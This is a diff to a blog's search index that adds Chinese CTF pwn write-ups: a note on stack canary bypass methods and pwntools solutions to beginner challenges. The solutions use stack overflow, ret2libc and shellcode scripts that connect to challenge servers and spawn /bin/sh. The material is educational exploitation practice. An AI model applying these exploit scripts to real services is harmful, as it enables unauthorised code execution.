@@ -1,6 +1,22 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[stack canary绕过思路]]></title>
+    <url>%2F2018%2F10%2F24%2Fstack-canary%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%2F</url>
+    <content type="text"><![CDATA[0x00 canary保护机制我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖ebp、eip等，从而达到劫持控制流的目的。然而stack canary这一技术的应用使得这种利用手段变得难以实现。 canary保护机制是在栈保护上则是在初始化一个栈帧时在栈底设置一个随机的canary值（最后两位必须是00），栈帧销毁前测试该值是否“死掉”，即是否被改变，若被改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。 如图var-c就是canary的地址，如果触发了栈溢出漏洞，还不知道canary的值，就会执行__stack_chk_fail函数。 0x01 泄露canary泄露canary的方法有： 通过格式化字符串漏洞来泄露canary的值 通过栈溢出漏洞来泄露canary的值 多进程程序的canary爆破 利用__stack_chk_fail函数泄露信息当然具体问题还要具体分析 未完待续。。。]]></content>
+      <tags>
+        <tag>ctf pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[萌新赛]]></title>
+    <url>%2F2018%2F10%2F13%2F%E4%B8%AD%E5%B7%A5%E8%90%8C%E6%96%B0%E8%B5%9B%2F</url>
+    <content type="text"><![CDATA[第一题 下载文件之后拖到IDA里看下，发现callsystem函数，那就简单了主函数如下 callsystem地址： 写出脚本：123456789from pwn import *s_addr=0x400596p=remote(&quot;120.79.51.146&quot;,10000)p.sendline(&apos;a&apos;*0x80+&apos;a&apos;*8+p64(s_addr))p.interactive() 第二题 拖到IDA没有（/bin/sh),也没有system函数，文件中给出了libc库，那就用吧脚本如下：123456789101112131415161718192021222324252627from pwn import *context.log_level=&quot;debug&quot;p=remote(&quot;120.79.51.146&quot;,10002)elf=ELF(&quot;rop32&quot;)main_addr=0x08048460plt_write=elf.plt[&quot;write&quot;]payload = &quot;A&quot; * 0x88 + &quot;A&quot; * 4 + p32(plt_write) + p32(main_addr) + p32(1) + p32(elf.got[&quot;write&quot;]) + p32(4)p.send(payload)write_addr=u32(p.recv(4))print &quot;write_addr=&quot;+hex(write_addr)libc=ELF(&quot;libc6.so&quot;)libc_system=libc.symbols[&quot;system&quot;]libc_binsh=next(libc.search(&quot;/bin/sh&quot;))libc_write=libc.symbols[&quot;write&quot;]system_addr=write_addr-libc_write+libc_systembinsh_addr=write_addr-libc_write+libc_binshprint &quot;system_addr=&quot;+hex(system_addr)raw_input()payload = &quot;A&quot; * 0x88 + &quot;A&quot; * 4 + p32(system_addr) + p32(0x77) + p32(binsh_addr)p.sendline(payload)p.interactive()]]></content>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[oj level0和level1总结]]></title>
     <url>%2F2018%2F09%2F21%2Foj-level0%E5%92%8Clevel1%E6%80%BB%E7%BB%93%2F</url>
     <content type="text"><![CDATA[仅献给刚入门的菜鸟，大佬请绕过 做题之前，需要知道pwntools的基本用法，如下：123456789from pwn import *context(arch = &apos;i386&apos;, os = &apos;linux&apos;) ;设置目标机的信息r = remote(&apos;exploitme.example.com&apos;, 31337) ;用来建立一个远程连接，url或者ip作为地址 然后指明端口,这里也可以仅仅使用本地文件,调试时方便:r.send(asm(shellcraft.sh())) ;r.send()将shellcode发送到远程连接r.interactive() ;将控制权交给用户，这样就可以使用打开的shell了 ps：具体的可以看我的另一篇博客 还需要知道pwn的一般套路，这里我只说说栈溢出的基本套路： 找到栈溢出地址（就是搞事情的地址），基本上都是buf的地址，这个地址需要用pwntools中的p32或p64进行转换，（若程序是32位的就用p32）才能用pwntools中的sendline发送到远程连接 构建shellcode，用一句话就行shellcode = asm(shellcraft.sh()) 构建payload，payload的基本构建：payload=shellcode+’a’*一个长度+p32(buf_addr)，次序一定不能乱 最后就可以发送payload，进行交互，得到shell的控制权，然后ls ，cat flag level0的脚本如下：1234567from pwn import *s_addr=0x400596r=remote(&quot;pwn2.jarvisoj.com&quot;,9881)p.sendline(&apos;a&apos;*0x80+&apos;a&apos;*8+p64(s_addr))p.interactive() 解释如下：level0是最简单的也是最基本的，这个题有一个函数callsystem，直接返回一个system（”/bin/sh”)也就是返回一个命令框，这就是我们想要的，所以不用构建shellcode和paload了脚本里的’a’0x80+’a’8代表的是如下图的两个数据，0x80是申请的总共地址，而8在buf的最下方 s_addr=0x400596代表的是函数callsystem的地址 level1的脚本如下：12345678910111213from pwn import *context(log_level = &apos;debug&apos;, arch = &apos;i386&apos;, os = &apos;linux&apos;)shellcode = asm(shellcraft.sh())io = remote(&apos;pwn2.jarvisoj.com&apos;, 9877)text = io.recvline()[14: -2]buf_addr = int(text, 16)payload = shellcode + &apos;a&apos; * (0x88 + 0x4 - len(shellcode)) + p32(buf_addr)io.send(payload)io.interactive()io.close() 解释如下：这里我只解释主要思路不明白如下两句话的可以百度12context(log_level = &apos;debug&apos;, arch = &apos;i386&apos;, os = &apos;linux&apos;)shellcode = asm(shellcraft.sh()) [14:-2]只是python里面的一个切片，代表”What’sthis:0xffee6c50?”这句话取第14个到倒数第二个字符这里的text为buf的地址，只不过是字符型的，需要int（text，16）用16进制的方法转化为int型 相比level0，这里多加了一个shellcode，和多减了一个len（shellcode）,shellcode和p32（buf_addr)的值如下图然后就需要慢慢理解了，为什么这么操作很多时候我们都只是知道怎么去做，但不知道为什么这样做，等以后我懂原理了，在补上解释吧。]]></content>
